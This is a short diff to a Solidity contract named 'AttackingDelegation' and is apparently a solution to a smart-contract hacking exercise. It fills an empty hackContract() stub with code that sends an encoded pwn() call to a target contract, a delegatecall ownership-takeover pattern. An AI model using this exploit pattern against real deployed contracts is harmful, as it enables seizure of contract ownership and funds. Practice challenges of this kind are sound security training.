@@ -11,5 +11,10 @@ contract AttackingDelegation {
 
     function hackContract() external {
         // Code me!
+        bytes memory data = abi.encodeWithSignature("pwn()");
+      //  Delegation(contractAddress).call(data);
+        address(contractAddress).call(data);
+
+
     }
 }
